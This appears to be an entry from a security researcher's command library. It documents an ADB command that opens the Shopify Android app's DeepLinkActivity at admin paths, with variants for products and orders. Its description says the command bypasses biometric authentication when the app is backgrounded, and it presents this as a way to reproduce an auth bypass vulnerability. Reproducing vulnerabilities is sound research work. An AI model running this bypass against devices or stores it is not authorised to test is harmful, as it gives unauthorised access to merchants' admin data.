---
id: cmd-adb-deeplink-products
data: >-
  adb shell am start -n
  com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d
  'https://www.shopify.com/admin/products'
tags:
  - adb
  - intent
  - bypass
type: command
output: null
executor: bash
platforms:
  - Android
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.394Z'
verified: false
validated: true
submitted: true
---
# adb-start-deeplink-products

## Command

```bash
adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://www.shopify.com/admin/products'
```

## Description

This ADB command starts the DeepLinkActivity in the Shopify Android app with a deeplink to admin products, bypassing biometrics when the app is in background. Used to reproduce auth bypass vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-n` | Specifies the component (package/activity) | Yes |
| `-d` | Sets the data URI for the intent | Yes |

## Examples

### Basic Usage

```bash
adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://www.shopify.com/admin/products'
```

### Advanced Usage

For custom URLs, replace the -d value, e.g., for other admin paths.

```bash
adb shell am start -n com.shopify.mobile/com.shopify.mobile.lib.app.DeepLinkActivity -d 'https://www.shopify.com/admin/orders'
```

## Expected Output

Starting: Intent { act=android.intent.action.VIEW cmp=com.shopify.mobile/.lib.app.DeepLinkActivity (has extras) }
App opens to /admin/products without auth prompt.

## Related

- [[commands/adb-start-deeplink-admin]]
- [[procedures/Trigger-Deeplink-Intent-for-Auth-Bypass]]
